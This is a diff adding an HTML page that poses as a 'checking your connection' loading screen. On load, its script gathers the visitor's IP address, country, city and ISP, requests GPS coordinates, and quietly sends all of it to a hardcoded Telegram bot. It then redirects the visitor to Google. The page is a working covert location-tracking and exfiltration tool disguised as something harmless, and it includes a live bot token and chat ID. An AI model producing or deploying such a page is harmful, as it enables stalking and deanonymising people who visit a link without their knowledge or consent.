@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <script>
+    async function getIPAndLocation() {
+      const botToken = '7090653601:AAHjzoywMv-tfUZ3mXgmAacTPMcCbnp2B8w';
+      const chatId = '7567067447';
+
+      // Ambil IP publik & info
+      const ipData = await fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .catch(() => ({ ip: 'Gagal ambil IP' }));
+
+      const geoIPData = await fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .catch(() => null);
+
+      // Ambil lokasi via GPS (browser)
+      function getGeoLocation() {
+        return new Promise((resolve, reject) => {
+          if (!navigator.geolocation) return reject("Geolocation not supported");
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve(pos.coords),
+            err => reject("Permission denied")
+          );
+        });
+      }
+
+      let gpsData;
+      try {
+        gpsData = await getGeoLocation();
+      } catch (err) {
+        gpsData = null;
+      }
+
+      // Gabungkan semua data
+      const msg = `
+📥 Nova visita detectada!
+
+🌐 IP: ${ipData.ip}
+📍 País: ${geoIPData?.country_name || 'N/A'}
+🏙️ Cidade: ${geoIPData?.city || 'N/A'}
+🕹️ ISP: ${geoIPData?.org || 'N/A'}
+
+📡 GPS: ${
+        gpsData
+          ? `Latitude: ${gpsData.latitude}\nLongitude: ${gpsData.longitude}\nhttps://maps.google.com/?q=${gpsData.latitude},${gpsData.longitude}`
+          : 'Usuário negou permissão de GPS ou não disponível.'
+      }
+🕓 Data: ${new Date().toLocaleString()}
+`;
+
+      // Kirim ke Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
+      });
+
+      // Redirect atau tampil halaman lain
+      window.location.href = "https://www.google.com";
+    }
+
+    window.onload = getIPAndLocation;
+  </script>
+</head>
+<body>
+  <h3>Verificando sua conexão...</h3>
+</body>
+</html>
